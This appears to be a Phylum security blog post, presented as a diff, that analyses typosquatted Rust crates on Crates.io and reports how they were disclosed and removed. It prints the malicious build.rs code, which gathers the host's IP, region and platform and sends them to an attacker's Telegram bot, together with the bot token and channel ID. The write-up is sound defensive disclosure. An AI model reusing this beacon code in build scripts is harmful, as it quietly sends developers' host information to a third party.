@@ -1,0 +1,103 @@
+
+Phylum routinely identifies malware and other software supply chain attacks targeting high-value, critical assets: an organization’s software developers. Most recently, we’ve reported on a flurry of sophisticated attacks targeting JavaScript developers, respawning malware on PyPI, and were the first to identify North Korean state actors publishing malicious packages to npm.
+With our fairly recent addition of Crates.io support, today we are detailing a thwarted software supply chain attack against Rust developers.
+
+Staging The Campaign
+In other ecosystems, we routinely see a common pattern prior to the publication of large-scale typosquat campaigns:
+
+The attacker typosquats several popular packages in a given ecosystem.
+The attacker publishes benign versions of these packages that contain little to no code.
+Sometime later (typically days or weeks), the attacker publishes an update with some callback mechanism for communicating with the attacker.
+The attacker publishes additional versions containing more overtly malicious payloads.
+The package publications to Crates.io were no different, though they didn’t get as far. On Aug 14, 2023, our automated system notified us of a potential typosquat package published by the user amaperf.
+
+Package	Version	Date/Time
+postgress	0.1.0	2023-08-14 15:44
+This package was not malicious and contained virtually no code at all. Here is the main.rs file associated with postgress@0.1.0:
+fn main() {
+    "Joke!)";
+}
+In this initial state, the package poses no threat to any user that installs it. The next day, on August 15, 2023, the actor published two additional packages in addition to updating the original postgress package. These packages removed the main.rs file in favor of an empty lib.rs.
+
+Package	Version	Date/Time
+postgress	0.1.1	2023-08-15 04:40
+if-cfg	0.1.0	2023-08-15 11:05
+xrvrv	0.1.0	2023-08-15 18:08
+Trending Towards Malicious
+Following the pattern we outlined above, several more packages were released on August 16, 2023. In these versions, a build.rs was added, which includes functionality for communicating host information back to the attacker.
+
+Package	Version	Date/Time
+xrvrv	0.1.1	2023-08-16 14:48
+postgress	0.19.6	2023-08-16 15:01
+if-cfg	0.1.1	2023-08-16 15:04
+serd	0.4.5	2023-08-16 15:26
+oncecell	0.1.0	2023-08-16 15:29
+lazystatic	0.1.0	2023-08-16 16:04
+envlogger	0.10.0	2023-08-16 16:07
+At the top of build.rs we see a Telegram token and channel ID defined.
+const BOT_TOKEN: &str = "6365984299:AAFLSYCsPAs1E2aS_KSSTenLMJKHmkxo7Ps";
+const CHANELL_ID: i128 = -1001901628644;
+The package then checks for the presence of a file mutex, located at env::var("OUT_DIR"). If it exists, we exit early. If it doesn’t exist, we create it and continue execution.
+let out = PathBuf::from(env::var("OUT_DIR")?);
+    if File::open(out.join("mutex")).is_ok() {
+        return Ok(());
+    }
+    
+    File::create(out.join("mutex"))?;
+Next, information about the host is retrieved:
+let resp = reqwest::blocking::get("<http://ip-api.com/json>")?;
+    let text = resp.text()?;
+    let json: serde_json::Value = serde_json::from_str(&text)?;
+
+    cfg_if::cfg_if! {
+        if #[cfg(windows)] {
+            let platform = "Windows";
+        } else if #[cfg(linux)] {
+            let platform = "Linux";
+        } else if #[cfg(macos)] {
+            let platform = "MacOS";
+        } else {
+            let platform = "unknown";
+        }
+    }
+This is a common pattern we see with credential stealers in other ecosystems.
+Finally, a message containing this information is dispatched to the previously defined Telegram channel.
+let msg = format!(
+        "[callback]%0Aip: {}%0Acountry: {}%0Aregion: {}%0Aplatform: {}%0A",
+        json["query"].as_str().unwrap_or("unknonw"),
+        json["countryCode"].as_str().unwrap_or("unknonw"),
+        json["regionName"].as_str().unwrap_or("unknonw"),
+        platform
+    );
+
+    let query = format!(
+        "<https://api.telegram.org/bot{}/sendMessage?chat_id={:}&text={}>",
+        BOT_TOKEN,
+        CHANELL_ID,
+        msg
+    );
+
+    reqwest::blocking::get(query)?;
+
+    Ok(())
+Telegram and Discord are popular communication channels used by attackers. What happened to good 'ol IRC?
+Or, more succinctly, in these versions, the attacker added functionality to send information about the target back to a Telegram channel they are monitoring. Querying the Telegram channel using the provided token doesn’t yield much information, and we were unable to determine if any successful callbacks had occurred.
+So What?
+You might be tempted to ask, “This doesn’t seem so bad, so what?”. As previously mentioned, this has the hallmarks of early preparations for a broader campaign. Typically, we will see one of two paths taken by the attacker from here:
+
+Upon receiving a successful callback from one of their packages, the attacker will publish subsequent versions with additional malicious capability (e.g., pulling secrets or sensitive files).
+Having proven out their (sometimes) crude callback infrastructure, the attacker will publish many more packages very quickly in an attempt to cast a wider net before the package registry takes down their malware.
+In both cases, the attacker is ramping up their attack in hopes of successfully compromising developers. The best-case scenario is to prevent the attack from continuing in the first place, which is exactly what we did.
+Reporting to Crates.io
+On August 16, 2023, Phylum made contact with The Rust Foundation to inform them of what appeared to be staging behavior for a malware campaign. They responded promptly, informed us that they agreed these packages looked like “clear malware” and forwarded our message to the Crates.io team.
+A short while later, they confirmed the removal of these packages and informed us that the user’s account had been locked as a result. As one might expect from the Rust community, this exchange was pleasant, and remediation resulted in the quick removal of the offending packages.
+What’s a Rust Dev to do?
+Phylum has a vested interest in the Rust ecosystem, as we’re Rustaceans at heart. Our infrastructure, our API, our open-source CLI, and our open-source sandbox are all written in Rust. While we enjoy identifying and blocking these software supply chain attacks, preventing and mitigating their impact on the Rust ecosystem has a direct benefit to the community that we’re so very fond of.
+As most attacks typically occur during package installation or build, it only makes sense to attempt to determine whether or not the package contains behaviors congruent with malware before the package is allowed to execute. Thus, we’ve developed a cargo extension that transparently queries the Phylum API for information about a package before it’s allowed to build. This extension ships as part of the open-sourced Phylum CLI and is as simple as:
+phylum cargo build
+Phylum wraps cargo, which makes asking our API what we know about this package seamless. We also support npm, pip, poetry, bundle, and yarn.
+In addition to this, we have developed and open-sourced a sandbox that limits access to disk and environment variables. We’ve rolled this into our CLI, which is available for the npm, pip, and yarn extensions. This adds another layer of protection to package installation by building/installing packages in a locked-down environment after they have been verified against the Phylum API.
+We are looking at adding the sandbox to other extensions and would greatly appreciate feedback from the community!
+Developers are High-value Targets
+It’s hard to say with any degree of certainty whether or not this campaign would have evolved into something more nefarious. What we can say is that we’ve seen this play out many times before in many other ecosystems, and the outcome was always the same. Developers were compromised, credentials/secrets were stolen, data was exfiltrated, and in some cases, money was lost as a result.
+With access to SSH keys, production infrastructure, and company IP, developers are now an extremely valuable target. It is prudent that we, as a community, remain skeptical of most packages/libraries we use in the software we write. To make this task easier, Phylum will continue to scan every package published to open-source, looking for software supply chain attacks targeting developers and the organizations they work for, blocking attacks before they have had a chance to get off the ground.
